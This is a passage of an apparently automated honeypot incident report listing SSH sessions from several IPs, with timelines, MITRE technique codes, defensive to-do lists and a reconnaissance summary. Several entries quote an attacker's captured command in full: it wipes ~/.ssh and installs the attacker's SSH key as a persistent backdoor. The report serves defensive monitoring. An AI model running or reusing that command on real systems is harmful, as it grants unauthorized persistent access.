| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:45:33` | `cowrie.session.connect` |
| `2026-04-14 04:45:33` | `cowrie.client.version` |
| `2026-04-14 04:45:34` | `cowrie.client.kex` |
| `2026-04-14 04:45:34` | `cowrie.login.success` |
| `2026-04-14 04:45:35` | `cowrie.session.params` |
| `2026-04-14 04:45:35` | `cowrie.command.input` |
| `2026-04-14 04:45:35` | `cowrie.command.failed` |
| `2026-04-14 04:45:35` | `cowrie.log.closed` |
| `2026-04-14 04:45:35` | `cowrie.session.params` |
| `2026-04-14 04:45:35` | `cowrie.command.input` |
| `2026-04-14 04:45:35` | `cowrie.session.file_download` |
| `2026-04-14 04:45:35` | `cowrie.log.closed` |
| `2026-04-14 04:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82d5bdad9f1

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:45 |
| **Last Seen** | 2026-04-14 04:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:45:37` | `cowrie.session.connect` |
| `2026-04-14 04:45:37` | `cowrie.client.version` |
| `2026-04-14 04:45:37` | `cowrie.client.kex` |
| `2026-04-14 04:45:38` | `cowrie.login.success` |
| `2026-04-14 04:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee9bf6f3435a

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:45 |
| **Last Seen** | 2026-04-14 04:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:45:57` | `cowrie.session.connect` |
| `2026-04-14 04:45:57` | `cowrie.client.version` |
| `2026-04-14 04:45:57` | `cowrie.client.kex` |
| `2026-04-14 04:45:58` | `cowrie.login.success` |
| `2026-04-14 04:45:59` | `cowrie.session.params` |
| `2026-04-14 04:45:59` | `cowrie.command.input` |
| `2026-04-14 04:45:59` | `cowrie.command.failed` |
| `2026-04-14 04:45:59` | `cowrie.log.closed` |
| `2026-04-14 04:45:59` | `cowrie.session.params` |
| `2026-04-14 04:45:59` | `cowrie.command.input` |
| `2026-04-14 04:46:00` | `cowrie.session.file_download` |
| `2026-04-14 04:46:00` | `cowrie.log.closed` |
| `2026-04-14 04:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0084dc565e3

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:46 |
| **Last Seen** | 2026-04-14 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:46:03` | `cowrie.session.connect` |
| `2026-04-14 04:46:03` | `cowrie.client.version` |
| `2026-04-14 04:46:03` | `cowrie.client.kex` |
| `2026-04-14 04:46:04` | `cowrie.login.success` |
| `2026-04-14 04:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057325d3ab34

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:48 |
| **Last Seen** | 2026-04-14 04:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:48:27` | `cowrie.session.connect` |
| `2026-04-14 04:48:27` | `cowrie.client.version` |
| `2026-04-14 04:48:27` | `cowrie.client.kex` |
| `2026-04-14 04:48:27` | `cowrie.login.success` |
| `2026-04-14 04:48:28` | `cowrie.session.params` |
| `2026-04-14 04:48:28` | `cowrie.command.input` |
| `2026-04-14 04:48:28` | `cowrie.command.failed` |
| `2026-04-14 04:48:28` | `cowrie.log.closed` |
| `2026-04-14 04:48:28` | `cowrie.session.params` |
| `2026-04-14 04:48:28` | `cowrie.command.input` |
| `2026-04-14 04:48:29` | `cowrie.session.file_download` |
| `2026-04-14 04:48:29` | `cowrie.log.closed` |
| `2026-04-14 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66affda39078

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:48 |
| **Last Seen** | 2026-04-14 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:48:31` | `cowrie.session.connect` |
| `2026-04-14 04:48:31` | `cowrie.client.version` |
| `2026-04-14 04:48:31` | `cowrie.client.kex` |
| `2026-04-14 04:48:32` | `cowrie.login.success` |
| `2026-04-14 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7d8573bd97

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:49 |
| **Last Seen** | 2026-04-14 04:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:49:22` | `cowrie.session.connect` |
| `2026-04-14 04:49:22` | `cowrie.client.version` |
| `2026-04-14 04:49:22` | `cowrie.client.kex` |
| `2026-04-14 04:49:23` | `cowrie.login.success` |
| `2026-04-14 04:49:23` | `cowrie.session.params` |
| `2026-04-14 04:49:23` | `cowrie.command.input` |
| `2026-04-14 04:49:23` | `cowrie.command.failed` |
| `2026-04-14 04:49:23` | `cowrie.log.closed` |
| `2026-04-14 04:49:24` | `cowrie.session.params` |
| `2026-04-14 04:49:24` | `cowrie.command.input` |
| `2026-04-14 04:49:24` | `cowrie.session.file_download` |
| `2026-04-14 04:49:24` | `cowrie.log.closed` |
| `2026-04-14 04:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd974014efd6

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:49 |
| **Last Seen** | 2026-04-14 04:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:49:26` | `cowrie.session.connect` |
| `2026-04-14 04:49:26` | `cowrie.client.version` |
| `2026-04-14 04:49:26` | `cowrie.client.kex` |
| `2026-04-14 04:49:27` | `cowrie.login.success` |
| `2026-04-14 04:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-869b6caa0c85

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:51 |
| **Last Seen** | 2026-04-14 04:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:51:42` | `cowrie.session.connect` |
| `2026-04-14 04:51:42` | `cowrie.client.version` |
| `2026-04-14 04:51:42` | `cowrie.client.kex` |
| `2026-04-14 04:51:43` | `cowrie.login.success` |
| `2026-04-14 04:51:43` | `cowrie.session.params` |
| `2026-04-14 04:51:43` | `cowrie.command.input` |
| `2026-04-14 04:51:43` | `cowrie.command.failed` |
| `2026-04-14 04:51:43` | `cowrie.log.closed` |
| `2026-04-14 04:51:44` | `cowrie.session.params` |
| `2026-04-14 04:51:44` | `cowrie.command.input` |
| `2026-04-14 04:51:44` | `cowrie.session.file_download` |
| `2026-04-14 04:51:44` | `cowrie.log.closed` |
| `2026-04-14 04:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ca2c38a1a3

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:51 |
| **Last Seen** | 2026-04-14 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:51:46` | `cowrie.session.connect` |
| `2026-04-14 04:51:46` | `cowrie.client.version` |
| `2026-04-14 04:51:46` | `cowrie.client.kex` |
| `2026-04-14 04:51:47` | `cowrie.login.success` |
| `2026-04-14 04:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a93576c320e

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:53 |
| **Last Seen** | 2026-04-14 04:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:53:11` | `cowrie.session.connect` |
| `2026-04-14 04:53:11` | `cowrie.client.version` |
| `2026-04-14 04:53:11` | `cowrie.client.kex` |
| `2026-04-14 04:53:12` | `cowrie.login.success` |
| `2026-04-14 04:53:12` | `cowrie.session.params` |
| `2026-04-14 04:53:12` | `cowrie.command.input` |
| `2026-04-14 04:53:12` | `cowrie.command.failed` |
| `2026-04-14 04:53:12` | `cowrie.log.closed` |
| `2026-04-14 04:53:13` | `cowrie.session.params` |
| `2026-04-14 04:53:13` | `cowrie.command.input` |
| `2026-04-14 04:53:13` | `cowrie.session.file_download` |
| `2026-04-14 04:53:13` | `cowrie.log.closed` |
| `2026-04-14 04:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297ef73e6d88

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:53 |
| **Last Seen** | 2026-04-14 04:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:53:15` | `cowrie.session.connect` |
| `2026-04-14 04:53:15` | `cowrie.client.version` |
| `2026-04-14 04:53:15` | `cowrie.client.kex` |
| `2026-04-14 04:53:16` | `cowrie.login.success` |
| `2026-04-14 04:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b999fba7c31b

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:56 |
| **Last Seen** | 2026-04-14 04:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:56:54` | `cowrie.session.connect` |
| `2026-04-14 04:56:54` | `cowrie.client.version` |
| `2026-04-14 04:56:54` | `cowrie.client.kex` |
| `2026-04-14 04:56:54` | `cowrie.login.success` |
| `2026-04-14 04:56:55` | `cowrie.session.params` |
| `2026-04-14 04:56:55` | `cowrie.command.input` |
| `2026-04-14 04:56:55` | `cowrie.command.failed` |
| `2026-04-14 04:56:55` | `cowrie.log.closed` |
| `2026-04-14 04:56:55` | `cowrie.session.params` |
| `2026-04-14 04:56:55` | `cowrie.command.input` |
| `2026-04-14 04:56:55` | `cowrie.session.file_download` |
| `2026-04-14 04:56:55` | `cowrie.log.closed` |
| `2026-04-14 04:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8592b2ab63c3

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:56 |
| **Last Seen** | 2026-04-14 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:56:57` | `cowrie.session.connect` |
| `2026-04-14 04:56:57` | `cowrie.client.version` |
| `2026-04-14 04:56:58` | `cowrie.client.kex` |
| `2026-04-14 04:56:58` | `cowrie.login.success` |
| `2026-04-14 04:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878789b57635

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:58 |
| **Last Seen** | 2026-04-14 04:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:58:46` | `cowrie.session.connect` |
| `2026-04-14 04:58:46` | `cowrie.client.version` |
| `2026-04-14 04:58:46` | `cowrie.client.kex` |
| `2026-04-14 04:58:46` | `cowrie.login.success` |
| `2026-04-14 04:58:47` | `cowrie.session.params` |
| `2026-04-14 04:58:47` | `cowrie.command.input` |
| `2026-04-14 04:58:47` | `cowrie.command.failed` |
| `2026-04-14 04:58:47` | `cowrie.log.closed` |
| `2026-04-14 04:58:47` | `cowrie.session.params` |
| `2026-04-14 04:58:47` | `cowrie.command.input` |
| `2026-04-14 04:58:47` | `cowrie.session.file_download` |
| `2026-04-14 04:58:47` | `cowrie.log.closed` |
| `2026-04-14 04:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaed6da9ff88

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:58 |
| **Last Seen** | 2026-04-14 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:58:50` | `cowrie.session.connect` |
| `2026-04-14 04:58:50` | `cowrie.client.version` |
| `2026-04-14 04:58:50` | `cowrie.client.kex` |
| `2026-04-14 04:58:50` | `cowrie.login.success` |
| `2026-04-14 04:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e774e5475a63

| Field | Detail |
|---|---|
| **Source IP** | `14.103.82[.]142` |
| **First Seen** | 2026-04-14 05:00 |
| **Last Seen** | 2026-04-14 05:00 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 05:00:05` | `cowrie.session.connect` |
| `2026-04-14 05:00:05` | `cowrie.client.version` |
| `2026-04-14 05:00:05` | `cowrie.client.kex` |
| `2026-04-14 05:00:05` | `cowrie.login.success` |
| `2026-04-14 05:00:48` | `cowrie.session.file_upload` |
| `2026-04-14 05:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.82[.]142` to AbuseIPDB if not already reported
- [ ] Block `14.103.82[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `153.99.92[.]11` | **28** | 2026-04-14 02:49 | 2026-04-14 03:12 | 45m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.227.152[.]250` | **27** | 2026-04-14 02:49 | 2026-04-14 03:21 | 37m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.161.170[.]12` | **25** | 2026-04-14 02:20 | 2026-04-14 02:40 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.220.238[.]30` | **25** | 2026-04-14 02:47 | 2026-04-14 03:05 | 46m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.89.253[.]36` | **25** | 2026-04-14 02:19 | 2026-04-14 02:56 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `170.79.37[.]82` | **25** | 2026-04-14 02:48 | 2026-04-14 03:29 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.225.146[.]23` | **25** | 2026-04-14 04:10 | 2026-04-14 04:58 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `205.164.114[.]59` | **25** | 2026-04-14 04:11 | 2026-04-14 04:47 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `213.6.203[.]226` | **25** | 2026-04-14 04:10 | 2026-04-14 04:51 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.23.122[.]235` | **10** | 2026-04-14 02:15 | 2026-04-14 02:33 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
